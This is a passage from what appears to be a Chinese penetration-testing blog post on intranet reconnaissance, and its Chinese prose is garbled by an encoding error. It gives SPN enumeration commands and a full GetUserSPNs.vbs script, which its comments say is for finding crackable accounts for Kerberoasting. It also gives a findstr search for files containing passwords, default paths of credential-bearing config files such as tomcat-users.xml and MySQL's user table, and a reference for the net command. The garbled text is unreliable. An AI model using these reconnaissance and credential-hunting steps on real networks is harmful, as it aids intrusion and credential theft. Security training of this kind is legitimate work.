LocalSystemï¼‰æˆ–ç”¨æˆ·å¸æˆ·ä¸‹ä¸ºæœåŠ¡å™¨æ³¨å†Œ SPNã€‚å¯¹äºå†…ç½®å¸æˆ·ï¼ŒSPN å°†è‡ªåŠ¨è¿›è¡Œæ³¨å†Œã€‚</p><blockquote><p>ç‰¹ç‚¹</p></blockquote><p>åœ¨æŸ¥è¯¢SPNçš„æ—¶å€™ï¼Œä¼šå‘åŸŸæ§åˆ¶å™¨å‘èµ·LDAPæŸ¥è¯¢ï¼Œè¿™æ˜¯æ­£å¸¸Kerberosç¥¨æ®è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥è¿™ä¸ªæ“ä½œå¾ˆéš¾è¢«æ£€æµ‹å‡ºæ¥ã€‚ä¸”ä¸éœ€è¦è¿›è¡Œå¤§èŒƒå›´æ‰«æï¼Œæ•ˆç‡é«˜ï¼Œä¸éœ€è¦ä¸ç›®æ ‡ä¸»æœºå»ºç«‹é“¾æ¥ï¼Œå¯ä»¥å¿«é€Ÿå‘ç°å†…ç½‘ä¸­çš„èµ„äº§ä»¥åŠæœåŠ¡</p><ol><li><p><strong>åˆ©ç”¨Windowsè‡ªå¸¦çš„setspnå·¥å…·ï¼Œæ™®é€šåŸŸç”¨æˆ·æƒé™æ‰§è¡Œå³å¯</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/32.png" alt="image-20200730212937561"></p><p>ç”±æˆªå›¾å¯ä»¥çœ‹åˆ°<strong>WIN-1OUEMJB0766</strong>ï¼ˆDCæœåŠ¡å™¨ï¼‰ä¸Šé¢è¿è¡ŒDNSæœåŠ¡ï¼Œè¯¥å‘½ä»¤å¯ä»¥æŠŠå†…ç½‘çš„ç›¸å…³æœåŠ¡éƒ½æ‰«æå‡ºæ¥åŒ…æ‹¬mysqlä¹‹ç±»çš„</p></li><li><p><strong>åˆ©ç”¨GetUserSPNs.vbsè·å–SPNç»“æœ</strong></p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nidem&#x2F;kerberoast</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„æºç </p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Edits by Tim Medin</span></span><br><span class="line"><span class="comment">&#x27; File:     GetUserSPNS.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents: Query the domain to find SPNs that use User accounts</span></span><br><span class="line"><span class="comment">&#x27; Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast</span></span><br><span class="line"><span class="comment">&#x27;           The password hash used with Computer accounts are infeasible to </span></span><br><span class="line"><span class="comment">&#x27;           crack; however, if the User account associated with an SPN may have</span></span><br><span class="line"><span class="comment">&#x27;           a crackable password. This tool will find those accounts. You do not</span></span><br><span class="line"><span class="comment">&#x27;           need any special local or domain permissions to run this script. </span></span><br><span class="line"><span class="comment">&#x27;           This script on a script supplied by Microsoft (details below).</span></span><br><span class="line"><span class="comment">&#x27; History:    2014/11/12     Tim Medin    Created</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Original Script Details:</span></span><br><span class="line"><span class="comment">&#x27; Copyright (c) Microsoft Corporation 2004 -</span></span><br><span class="line"><span class="comment">&#x27; File:                querySpn.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents:     Query a given SPN in a given forest to find the owners</span></span><br><span class="line"><span class="comment">&#x27; History:         7/7/2004     Craig Wiand     Created        </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Option</span> <span class="keyword">Explicit</span>         </span><br><span class="line"><span class="keyword">Dim</span> oConnection, oCmd, oRecordSet</span><br><span class="line"><span class="keyword">Dim</span> oGC, oNSP</span><br><span class="line"><span class="keyword">Dim</span> strGCPath, strClass, strADOQuery</span><br><span class="line"><span class="keyword">Dim</span> vObjClass, vSPNs, vName</span><br><span class="line"></span><br><span class="line">ParseCommandLine()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Set up the connection ---</span></span><br><span class="line"><span class="keyword">Set</span> oConnection = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Connection&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> oCmd = <span class="built_in">CReateObject</span>(<span class="string">&quot;ADODB.Command&quot;</span>)</span><br><span class="line">oConnection.Provider = <span class="string">&quot;ADsDSOObject&quot;</span></span><br><span class="line">oConnection.Open <span class="string">&quot;ADs Provider&quot;</span></span><br><span class="line"><span class="keyword">Set</span> oCmd.ActiveConnection = oConnection</span><br><span class="line">oCmd.Properties(<span class="string">&quot;Page Size&quot;</span>) = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Build the query string ---</span></span><br><span class="line">strADOQuery = <span class="string">&quot;&lt;&quot;</span> + strGCPath + <span class="string">&quot;&gt;;(&amp;(!objectClass=computer)(servicePrincipalName=*));&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;dnsHostName,distinguishedName,servicePrincipalName,objectClass,&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;samAccountName;subtree&quot;</span></span><br><span class="line">oCmd.CommandText = strADOQuery</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Execute the query for the object in the directory ---</span></span><br><span class="line"><span class="keyword">Set</span> oRecordSet = oCmd.<span class="keyword">Execute</span></span><br><span class="line"><span class="keyword">If</span> oRecordSet.EOF <span class="keyword">and</span> oRecordSet.Bof <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;No SPNs found!&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">Not</span> oRecordset.Eof</span><br><span class="line">Wscript.Echo oRecordset.Fields(<span class="string">&quot;distinguishedName&quot;</span>)</span><br><span class="line"><span class="comment">&#x27;vObjClass = oRecordset.Fields(&quot;objectClass&quot;)</span></span><br><span class="line"><span class="comment">&#x27;strClass = vObjClass( UBound(vObjClass) )</span></span><br><span class="line"><span class="comment">&#x27;Wscript.Echo &quot;Class: &quot; &amp; strClass</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">UCase</span>(strClass) = <span class="string">&quot;COMPUTER&quot;</span> <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;Computer DNS: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;dnsHostName&quot;</span>)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;User Logon: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;samAccountName&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Display the SPNs on the object --- </span></span><br><span class="line">vSPNs = oRecordset.Fields(<span class="string">&quot;servicePrincipalName&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> vName <span class="keyword">in</span> vSPNs</span><br><span class="line">Wscript.Echo <span class="string">&quot;-- &quot;</span> + vName</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">oRecordset.MoveNext</span><br><span class="line"><span class="keyword">Wend</span></span><br><span class="line"></span><br><span class="line">oRecordset.Close</span><br><span class="line">oConnection.Close</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ShowUsage()</span><br><span class="line">Wscript.Echo <span class="string">&quot; USAGE:        &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; SpnToFind [GC Servername or Forestname]&quot;</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; Corp.com&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ParseCommandLine()</span><br><span class="line"><span class="keyword">If</span> WScript.Arguments.Count = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">If</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-h&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;--help&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-?&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;/?&quot;</span> <span class="keyword">Then</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">strGCPath = <span class="string">&quot;GC://&quot;</span> &amp; WScript.Arguments(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">ElseIf</span> WScript.Arguments.Count = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line"><span class="comment">&#x27; Set the GC</span></span><br><span class="line"><span class="keyword">Set</span> oNSP = <span class="built_in">GetObject</span>(<span class="string">&quot;GC:&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> oGC <span class="keyword">in</span> oNSP</span><br><span class="line">strGCPath = oGC.ADsPath</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/33.png" alt="image-20200730214227054"></p></li></ol><h3 id="ç«¯å£è¿æ¥"><a href="#ç«¯å£è¿æ¥" class="headerlink" title="ç«¯å£è¿æ¥"></a>ç«¯å£è¿æ¥</h3><p>åˆ©ç”¨<code>netstat -ano</code>å‘½ä»¤è·å–æœºå™¨é€šä¿¡ä¿¡æ¯ï¼Œæ ¹æ®é€šä¿¡çš„ç«¯å£ã€ipå¯ä»¥è·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚å¦‚æœé€šä¿¡ä¿¡æ¯æ˜¯å…¥æµé‡ï¼Œåˆ™å¯ä»¥è·å–åˆ°è·³æ¿æœº/å ¡å’æœºã€ç®¡ç†å‘˜çš„PCæ¥æºIPã€æœ¬åœ°webåº”ç”¨ç«¯å£ç­‰ä¿¡æ¯ï¼›å¦‚æœé€šä¿¡ä¿¡æ¯æ˜¯å‡ºæµé‡ï¼Œåˆ™å¯ä»¥è·å–åˆ°æ•æ„Ÿç«¯å£ï¼ˆredisã€mysqlã€mssqlç­‰ï¼‰ã€APIç«¯å£ç­‰ä¿¡æ¯ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/34.png" alt="image-20200730215441721"></p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>ä¸€ä¸ªæ­£å¸¸çš„Webåº”ç”¨è‚¯å®šæœ‰å¯¹åº”çš„æ•°æ®åº“è´¦å·å¯†ç ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯»æ‰¾åŒ…å«å¯†ç å­—æ®µçš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr  /s /m <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤æ˜¯æŸ¥æ‰¾å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œä¸æ˜¯å…¨å±€æœç´¢</p><p>æ¥ä¸‹æ¥æ˜¯å„ä¸ªä¸­é—´ä»¶çš„é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Tomcat</span><br><span class="line">&#x2F;CATALINA_HOME&#x2F;conf&#x2F;tomcat-users.xml</span><br><span class="line">#Apache</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">#Nginx</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">#Wdcp</span><br><span class="line">&#x2F;www&#x2F;wdlinux&#x2F;wdcp&#x2F;conf&#x2F;mrpw.conf</span><br><span class="line">#Mysql</span><br><span class="line">&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD</span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h3><h4 id="netå‚æ•°è¯¦è§£"><a href="#netå‚æ•°è¯¦è§£" class="headerlink" title="netå‚æ•°è¯¦è§£"></a>netå‚æ•°è¯¦è§£</h4><p>ç›´æ¥ä½¿ç”¨<code>net /?</code>å‘½ä»¤å³å¯æŸ¥çœ‹ï¼Œä¸‹é¢æ˜¯æˆ‘ç”¨è°·æ­Œç¿»è¯‘çš„ï¼Œå‡‘åˆçœ‹</p><blockquote><p>ACCOUNTS</p></blockquote><p>å¦‚æœè¾“å…¥ä¸å¸¦å‚æ•°çš„<code>net accounts</code>æ˜¾ç¤ºå½“å‰å¯†ç è®¾ç½®ã€ç™»å½•æ—¶é™åŠåŸŸä¿¡æ¯</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>/forcelogoff:&#123;minutes|no&#125;</code></td><td>è®¾ç½®å½“ç”¨æˆ·å¸å·æˆ–æœ‰æ•ˆç™»å½•æ—¶é—´è¿‡æœŸæ—¶</td></tr><tr><td><code>/minpwlen:length</code></td><td>è®¾ç½®ç”¨æˆ·å¸å·å¯†ç çš„æœ€å°‘å­—ç¬¦æ•°</td></tr><tr><td><code>/maxpwage:&#123;days|unlimited&#125;</code></td><td>è®¾ç½®ç”¨æˆ·å¸å·å¯†ç æœ‰æ•ˆçš„æœ€å¤§å¤©æ•°</td></tr><tr><td><code>/minpwage:days</code></td><td>è®¾ç½®ç”¨æˆ·å¿…é¡»ä¿æŒåŸå¯†ç çš„æœ€å°å¤©æ•°</td></tr><tr><td><code>/uniquepw:number</code></td><td>è¦æ±‚ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¿…é¡»åœ¨ç»è¿‡numberæ¬¡åæ‰èƒ½é‡å¤ä½¿ç”¨ä¸ä¹‹ç›¸åŒçš„å¯†ç </td></tr><tr><td><code>/domain</code></td><td>åœ¨å½“å‰åŸŸçš„ä¸»åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œè¯¥æ“ä½œ</td></tr><tr><td><code>/sync</code></td><td>å½“ç”¨äºä¸»åŸŸæ§åˆ¶å™¨æ—¶ï¼Œè¯¥å‘½ä»¤ä½¿åŸŸä¸­æ‰€æœ‰å¤‡ä»½åŸŸæ§åˆ¶å™¨åŒæ­¥</td></tr></tbody></table><blockquote><p>COMPUTER </p></blockquote><p>ä½œç”¨ï¼šä»åŸŸæ•°æ®åº“ä¸­æ·»åŠ æˆ–åˆ é™¤è®¡ç®—æœºã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net computer \\computername &#123;/add | /del&#125;</code></p><p>ä¸¾ä¾‹ï¼š<code>net computer \\ascotbe /add</code>å°†è®¡ç®—æœº<strong>ascotbe</strong>æ·»åŠ åˆ°ç™»å½•åŸŸã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>æŒ‡å®šè¦æ·»åŠ åˆ°åŸŸæˆ–ä»åŸŸä¸­åˆ é™¤çš„è®¡ç®—æœº</td></tr><tr><td><code>/add</code></td><td>å°†æŒ‡å®šè®¡ç®—æœºæ·»åŠ åˆ°åŸŸ</td></tr><tr><td><code>/del</code></td><td>å°†æŒ‡å®šè®¡ç®—æœºä»åŸŸä¸­åˆ é™¤</td></tr></tbody></table><blockquote><p>CONFIG</p></blockquote><p>ä½œç”¨ï¼šæ˜¾ç¤ºå½“å‰è¿è¡Œçš„å¯é…ç½®æœåŠ¡ï¼Œæˆ–æ˜¾ç¤ºå¹¶æ›´æ”¹æŸé¡¹æœåŠ¡çš„è®¾ç½®ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net config [SERVER | WORKSTATION]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net config</code>æ˜¾ç¤ºå¯é…ç½®æœåŠ¡çš„åˆ—è¡¨</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>service</code></td><td>æœåŠ¡å™¨</td></tr><tr><td><code>WORKSTATION</code></td><td>å·¥ä½œç«™</td></tr></tbody></table><blockquote><p>CONTINUE</p></blockquote><p>ä½œç”¨ï¼šé‡æ–°æ¿€æ´»æŒ‚èµ·çš„æœåŠ¡ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net continue service</code></p><blockquote><p> FILE</p></blockquote><p>ä½œç”¨ï¼šæ˜¾ç¤ºæŸæœåŠ¡å™¨ä¸Šæ‰€æœ‰æ‰“å¼€çš„å…±äº«æ–‡ä»¶ååŠé”å®šæ–‡ä»¶æ•°ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net file [id [/close]]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net file</code>è·å¾—æœåŠ¡å™¨ä¸Šæ‰“å¼€æ–‡ä»¶çš„åˆ—è¡¨</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>id</code></td><td>æ–‡ä»¶æ ‡è¯†å·</td></tr><tr><td><code>/close</code></td><td>å…³é—­æ‰“å¼€çš„æ–‡ä»¶å¹¶é‡Šæ”¾é”å®šè®°å½•</td></tr></tbody></table><blockquote><p>GROUP</p></blockquote><p>ä½œç”¨ï¼šåœ¨ Windows NT/2000/2003 Server åŸŸä¸­æ·»åŠ ã€æ˜¾ç¤ºæˆ–æ›´æ”¹å…¨å±€ç»„ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net group groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net group</code>æ˜¾ç¤ºæœåŠ¡å™¨åç§°åŠæœåŠ¡å™¨çš„ç»„åç§°</p><p>ä¸¾ä¾‹ï¼š<code>net group test GHS1 GHS2 /add</code>å°†ç°æœ‰ç”¨æˆ·å¸å·GHS1å’ŒGHS2æ·»åŠ åˆ°æœ¬åœ°è®¡ç®—æœºçš„testç»„ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>groupname</code></td><td>è¦æ·»åŠ ã€æ‰©å±•æˆ–åˆ é™¤çš„ç»„</td></tr><tr><td><code>/comment:&quot;text&quot;</code></td><td>ä¸ºæ–°å»ºç»„æˆ–ç°æœ‰ç»„æ·»åŠ æ³¨é‡Š</td></tr><tr><td><code>/domain</code></td><td>åœ¨å½“å‰åŸŸçš„ä¸»åŸŸæ§åˆ¶å™¨ä¸­æ‰§è¡Œè¯¥æ“ä½œï¼Œå¦åˆ™åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šæ‰§è¡Œæ“ä½œ</td></tr><tr><td><code>username[...]</code></td><td>åˆ—è¡¨æ˜¾ç¤ºè¦æ·»åŠ åˆ°ç»„æˆ–ä»ç»„ä¸­åˆ é™¤çš„ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·</td></tr><tr><td><code>/add</code></td><td>æ·»åŠ ç»„æˆ–åœ¨ç»„ä¸­æ·»åŠ ç”¨æˆ·å</td></tr><tr><td><code>/delete</code></td><td>åˆ é™¤ç»„æˆ–ä»ç»„ä¸­åˆ é™¤ç”¨æˆ·å</td></tr></tbody></table><blockquote><p>LOCALGROUP</p></blockquote><p>ä½œç”¨ï¼šæ·»åŠ ã€æ˜¾ç¤ºæˆ–æ›´æ”¹æœ¬åœ°ç»„ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net localgroup groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net localgroup</code>æ˜¾ç¤ºæœåŠ¡å™¨åç§°å’Œè®¡ç®—æœºçš„æœ¬åœ°ç»„åç§°</p><p>ä¸¾ä¾‹ï¼š</p><ul><li><code>net localgroup ggg /add</code> å°†åä¸ºgggçš„æœ¬åœ°ç»„æ·»åŠ åˆ°æœ¬åœ°ç”¨æˆ·å¸å·æ•°æ®åº“ï¼›ã€€ã€€</li><li><code>net localgroup ggg </code>æ˜¾ç¤ºgggæœ¬åœ°ç»„ä¸­çš„ç”¨æˆ·ã€‚</li></ul><p>å‚æ•°å’Œè§£é‡Šéƒ½å’Œä¸Šé¢ä¸€æ ·è¿™è¾¹å°±ä¸å†™äº†</p><blockquote><p>PAUSE</p></blockquote><p>ä½œç”¨ï¼šæš‚åœæ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net pause service</code></p><blockquote><p>SESSION</p></blockquote><p>ä½œç”¨ï¼šåˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºå’Œä¸ä¹‹è¿æ¥çš„å®¢æˆ·ç«¯çš„ä¼šè¯ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net session [\\computername] [/delete] [/list]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net session</code>æ˜¾ç¤ºæ‰€æœ‰ä¸æœ¬åœ°è®¡ç®—æœºçš„ä¼šè¯çš„ä¿¡æ¯ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>æ ‡è¯†è¦åˆ—å‡ºæˆ–æ–­å¼€ä¼šè¯çš„è®¡ç®—æœºã€‚</td></tr><tr><td><code>/delete</code></td><td>ç»“æŸä¸ <code>\\computername </code>è®¡ç®—æœºä¼šè¯å¹¶å…³é—­æœ¬æ¬¡ä¼šè¯æœŸé—´è®¡ç®—æœºçš„æ‰€æœ‰æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœçœç•¥<code>\\computername</code>å‚æ•°ï¼Œå°†å–æ¶ˆä¸æœ¬åœ°è®¡ç®—æœºçš„æ‰€æœ‰ä¼šè¯ã€‚</td></tr><tr><td><code>/list</code></td><td>åˆ—å‡ºæ¸…å•</td></tr></tbody></table><blockquote><p>SHARE</p></blockquote><p>ä½œç”¨ï¼šåˆ›å»ºã€åˆ é™¤æˆ–æ˜¾ç¤ºå…±äº«èµ„æºã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net share sharename=drive:path [/users:number | /unlimited] [/remark:&quot;text&quot;]</code></p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>net share</code>æ˜¾ç¤ºæœ¬åœ°è®¡ç®—æœºä¸Šæ‰€æœ‰å…±äº«èµ„æºçš„ä¿¡æ¯</p><p>ä¸¾ä¾‹ï¼š </p><ul><li><code>net share ascotbe=c:\temp /remark:&quot;my first share&quot;</code>ä»¥ascotbeä¸ºå…±äº«åå…±äº«<strong>C:\temp</strong></li><li><code>net share ascotbe /delete</code>åœæ­¢å…±äº«ascotbeç›®å½•</li></ul><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>sharename</code></td><td>æ˜¯å…±äº«èµ„æºçš„ç½‘ç»œåç§°</td></tr><tr><td><code>drive:path</code></td><td>æŒ‡å®šå…±äº«ç›®å½•çš„ç»å¯¹è·¯å¾„</td></tr><tr><td><code>/users:number</code></td><td>è®¾ç½®å¯åŒæ—¶è®¿é—®å…±äº«èµ„æºçš„æœ€å¤§ç”¨æˆ·æ•°</td></tr><tr><td><code>/unlimited</code></td><td>ä¸é™åˆ¶åŒæ—¶è®¿é—®å…±äº«èµ„æºçš„ç”¨æˆ·æ•°</td></tr><tr><td><code>/remark:&quot;text&quot;</code></td><td>æ·»åŠ å…³äºèµ„æºçš„æ³¨é‡Šï¼Œæ³¨é‡Šæ–‡å­—ç”¨å¼•å·å¼•ä½</td></tr></tbody></table><blockquote><p> START</p></blockquote><p>ä½œç”¨ï¼šå¯åŠ¨æœåŠ¡ï¼Œæˆ–æ˜¾ç¤ºå·²å¯åŠ¨æœåŠ¡çš„åˆ—è¡¨ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net start service</code></p><blockquote><p>STATISTICS</p></blockquote><p>ä½œç”¨ï¼šæ˜¾ç¤ºæœ¬åœ°å·¥ä½œç«™æˆ–æœåŠ¡å™¨æœåŠ¡çš„ç»Ÿè®¡è®°å½•ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net statistics workstation </code></p><blockquote><p> STOP</p></blockquote><p>ä½œç”¨ï¼šåœæ­¢ Windows NT/2000/2003 ç½‘ç»œæœåŠ¡ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>net stop service</code></p><p>ç°åœ¨çš„ç³»ç»Ÿéƒ½æ²¡æœ‰è¿™ä¸ªäº†ï¼Œä¸‹é¢åˆ—å‡ºèƒ½åœæ­¢çš„æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(1)alerter(è­¦æŠ¥)</span><br><span class="line">(2)client service for Netware(Netware å®¢æˆ·ç«¯æœåŠ¡)</span><br><span class="line">(3)clipbook server(å‰ªè´´ç°¿æœåŠ¡å™¨)</span><br><span class="line">(4)computer browser(è®¡ç®—æœºæµè§ˆå™¨)</span><br><span class="line">(5)directory 